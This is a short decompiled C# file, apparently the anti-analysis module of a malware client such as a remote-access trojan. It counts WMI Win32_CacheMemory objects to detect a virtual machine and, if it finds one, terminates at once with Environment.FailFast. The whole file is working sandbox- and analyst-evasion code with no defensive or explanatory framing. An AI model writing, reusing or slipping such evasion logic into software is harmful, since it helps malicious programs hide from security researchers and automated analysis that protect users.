using System;
using System.Management;
using System.Threading;

namespace Client.Helper;

internal class Anti_Analysis
{
	public static void RunAntiAnalysis()
	{
		if (isVM_by_wim_temper())
		{
			Environment.FailFast(null);
		}
		Thread.Sleep(1000);
	}

	public static bool isVM_by_wim_temper()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected O, but got Unknown
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher((ObjectQuery)new SelectQuery("Select * from Win32_CacheMemory"));
		int num = 0;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				_ = (ManagementObject)enumerator.get_Current();
				num++;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		if (num == 0)
		{
			return true;
		}
		return false;
	}
}
